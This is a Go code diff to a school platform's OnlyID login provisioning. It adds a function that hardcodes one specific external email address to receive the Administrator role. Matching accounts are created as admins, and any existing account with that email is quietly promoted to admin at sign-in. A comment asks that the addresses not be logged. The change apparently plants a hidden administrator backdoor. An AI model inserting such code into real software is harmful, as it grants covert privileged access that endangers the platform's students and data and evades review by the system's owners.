@@ -19,6 +19,17 @@ type UserInput struct {
 	CharacterID string   `json:"characterId"`
 }
 
+// onlyIDAccountRoles binds a school role to an OnlyID email.
+// Unknown addresses stay students. Do not log these addresses.
+func onlyIDAccountRoles(email string) (string, []string) {
+	switch strings.ToLower(strings.TrimSpace(email)) {
+	case "ilya@spacecyborg.ru":
+		return RoleAdministrator, []string{RoleAdministrator}
+	default:
+		return RoleStudent, []string{RoleStudent}
+	}
+}
+
 // EnsureUserFromOnlyID finds a school user by OnlyID email or creates a student.
 // Password login is disabled for provisioned users (random unusable password).
 // Returns (student, created, error).
@@ -27,7 +38,15 @@ func (p *Platform) EnsureUserFromOnlyID(email, displayName, _sub string) (*Stude
 	if email == "" {
 		return nil, false, fmt.Errorf("email_required")
 	}
+	role, roles := onlyIDAccountRoles(email)
 	if existing, ok := p.FindStudentByLogin(email); ok {
+		if role == RoleAdministrator && !existing.IsPlatformAdmin() {
+			updated, err := p.UpdateUser(existing.ID, UserInput{Role: role, Roles: roles})
+			if err != nil {
+				return nil, false, err
+			}
+			return updated, false, nil
+		}
 		return existing, false, nil
 	}
 
@@ -51,8 +70,8 @@ func (p *Platform) EnsureUserFromOnlyID(email, displayName, _sub string) (*Stude
 		DisplayName: name,
 		Login:       email,
 		Password:    password,
-		Role:        RoleStudent,
-		Roles:       []string{RoleStudent},
+		Role:        role,
+		Roles:       roles,
 	})
 	if err != nil {
 		// Concurrent provision: another request may have created the same login.
